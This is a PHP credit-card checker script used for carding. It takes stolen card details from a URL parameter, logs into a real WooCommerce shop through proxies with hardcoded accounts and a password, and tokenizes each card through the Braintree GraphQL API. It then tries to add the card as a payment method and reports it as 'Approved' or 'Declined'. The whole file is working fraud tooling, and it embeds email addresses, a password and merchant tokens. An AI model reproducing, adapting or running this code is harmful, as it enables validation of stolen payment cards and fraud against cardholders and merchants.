<?php
error_reporting(1);

$cookie = "data/".str_shuffle("cookie_checker".rand(0,1000)). ".txt";
$card = $_GET["lista"];
$array = explode("|", $card);
$cc = $array[0];
$mes = $array[1];
$ano = $array[2];
$mes1 = str_replace(0,"",$mes);
$ano1 = str_replace(20,"",$ano);
$cvv = $array[3];

if(!preg_match("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $card)) {
exit(json_encode([
"status"=>false,
"card"=>$card,
"message"=>"this not card",
"cards"=>[
"card"=>$cc,
"month"=>$mes,
"year"=>$ano,
"cvv"=>$cvv,
],
],64|128|256));
}
include("bin.php");
include "proxy.php";
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}



$array = array(
[
"email"=>"ameenmohameid@gmail.com",
],
[
"email"=>"banonndylann@gmail.com",
],
[
"email"=>"ameenmohameid18@gmail.com",
], 
[
"email"=>"banonggccvisi@gmail.com",
]
);
//while(true){
$rand = array_rand($array);
$email = $array[$rand]["email"];

$ch = curl_init('https://cosyowl.com/account/add-payment-method');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
'authority: cosyowl.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: en-GB,en-EG;q=0.9,en;q=0.8,ar-EG;q=0.7,ar;q=0.6,en-US;q=0.5',
'cache-control: no-cache',
'content-type: application/x-www-form-urlencoded',
'origin: https://cosyowl.com',
'pragma: no-cache',
'referer: https://cosyowl.com/account/add-payment-method',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'sec-fetch-user: ?1',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',

]);
curl_setopt($ch, CURLOPT_PROXY, host.":".port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, user.":".pass);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
$r1 = curl_exec($ch);

$lnonce = trim(strip_tags(getStr($r1,'name="woocommerce-login-nonce" value="','"')));   

$ch = curl_init('https://cosyowl.com/account/add-payment-method');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
'authority: cosyowl.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: en-GB,en-EG;q=0.9,en;q=0.8,ar-EG;q=0.7,ar;q=0.6,en-US;q=0.5',
'cache-control: no-cache',
'content-type: application/x-www-form-urlencoded',
'origin: https://cosyowl.com',
'pragma: no-cache',
'referer: https://cosyowl.com/account/add-payment-method',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'sec-fetch-user: ?1',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
]);
curl_setopt($ch, CURLOPT_PROXY, host.":".port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, user.":".pass);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$email.'&password=AMeen#2004#&woocommerce-login-nonce='.$lnonce.'&_wp_http_referer=%2Faccount%2Fadd-payment-method&login=Log+in');
$r2 = curl_exec($ch);
curl_close($ch);

$anonce = trim(strip_tags(getStr($r2,'name="woocommerce-add-payment-method-nonce" value="','"')));
$T = trim(strip_tags(getStr($r2,'var wc_braintree_client_token = ["','"')));
$TK = base64_decode($T);
$au = trim(strip_tags(getstr($TK, '"authorizationFingerprint":"','",')));

    

$ch = curl_init('https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/json',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
'Authorization: Bearer '.$au,
'Braintree-Version: 2018-05-10',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"8ea3f338-bcc3-4389-954d-4a5decb483cb"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"10080","streetAddress":"New york 10080"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$r5 = curl_exec($ch);
curl_close($ch);

$token = trim(strip_tags(getStr($r5,'"token":"','"')));
$bin = trim(strip_tags(getStr($r5,'"bin":"','"')));
$Bank1 = trim(strip_tags(getStr($r5, '"issuingBank":"','"')));
$Bank = strtoupper($Bank1);


    

$ch = curl_init('https://cosyowl.com/account/add-payment-method');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%228d25c20e9ae347e84855b39d51cccb3d%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%222d36a1c8f0e7b1abaeec214fb3496a71%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fhnscvdb6y54srk4w%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fhnscvdb6y54srk4w%22%7D%2C%22merchantId%22%3A%22hnscvdb6y54srk4w%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22IE%22%2C%22currencyCode%22%3A%22GBP%22%2C%22merchantIdentifier%22%3A%22hnscvdb6y54srk4w%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2ZjZmNjQwMS0zOTIzLTQ2NTgtYjEzMy01MDQwNjAxYjFlZGQiLCJpYXQiOjE2OTMxMDY1MjIsImV4cCI6MTY5MzExMzcyMiwiaXNzIjoiNjMyYmFiZjg1ZDQ3YjI2YTQ0YTIyOTA1IiwiT3JnVW5pdElkIjoiNjMyYmFiZjdmNWNlNmI0NTUxYTM4NTUxIn0.b5FTOTaiO5LgT7yQj8t-dxKDCzkZVM3Y7w2gzX_YzG4%22%7D%2C%22androidPay%22%3A%7B%22displayName%22%3A%22Volsom+Ltd%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTMxOTI5MjIsImp0aSI6Ijk3Zjg5NTNkLTg5NWEtNDc1My04MDhhLTgwZTZhMmMzMzRkNSIsInN1YiI6Imhuc2N2ZGI2eTU0c3JrNHciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imhuc2N2ZGI2eTU0c3JrNHciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.uuecinp_V53wlDcw9ZPiA5E1JiN6maenWeK6vVBl6IDELNYWVZm7I0SOKAXux47DP46M4rODTO1RYKjh2-t0rA%22%2C%22paypalClientId%22%3Anull%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Volsom+Ltd%22%2C%22clientId%22%3A%22AV8syMc7Yms95tyMd5FusQpABARdgQL4Iu32AEkpd2bKav0FHK8elRgVuqzhbB0eccIeqH3V_dT58-DN%22%2C%22privacyUrl%22%3Anull%2C%22userAgreementUrl%22%3Anull%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22volsomltdGBP%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22GBP%22%7D%7D&woocommerce-add-payment-method-nonce='.$anonce.'&_wp_http_referer=%2Faccount%2Fadd-payment-method&woocommerce_add_payment_method=1');
$r6 = curl_exec($ch);
curl_close($ch);
//var_dump($r6);

$msg = trim(strip_tags(getStr($r6,'Reason: ','</li>')));
$msg1 = trim(strip_tags(getStr($r6,'<div class="woocommerce-notices-wrapper"><ul class="woocommerce-error" role="alert">','</ul>')));


if(strpos($msg,"risk")){
$msg = "RISK: Retry this BIN later.";
}
//var_dump($r6);

$gate = "Braintree Auth";
if(strpos($r6,"Payment method successfully added.") or strpos($msg,"street address.") or strpos($r6, "Gateway Rejected: avs")){
$status = "Approved";
$message = "1000: Approved";
$emoji = "✅";

} else if($msg == "Insufficient Funds"){
$status = "Approved";
$message = "1000: Approved";
$emoji = "✅";
} else if(strpos($r6,"Gateway Rejected: cvv")){
$status = "Approved";
$message = "1000: Approved";
$emoji = "✅";

} else {
$status = "Declined";
$emoji = "❌";
$message = $msg;
}
unlink($cookie);
echo json_encode([
"status"=>true,
"card"=>$card,
"cards"=>[
"card"=>$cc,
"month"=>$mes,
"year"=>$ano,
"cvv"=>$cvv,
],
"check"=>$status,
"result"=>$message,
"gate"=>$gate,
"emoji"=>$emoji,
"proxy"=>$proxy_ip,
"status_proxy"=>$status_proxy,
"bin"=>$bin,
"bank"=>$bank ?? "Unknown",
"country"=>$country ?? "Unknown",
"flag"=>$flag ?? "Unknown",
"scheme"=>$scheme ?? "Unknown",
"type"=>$type ?? "Unknown",
"brand"=>$brand ?? "Unknown"
],64|128|256);
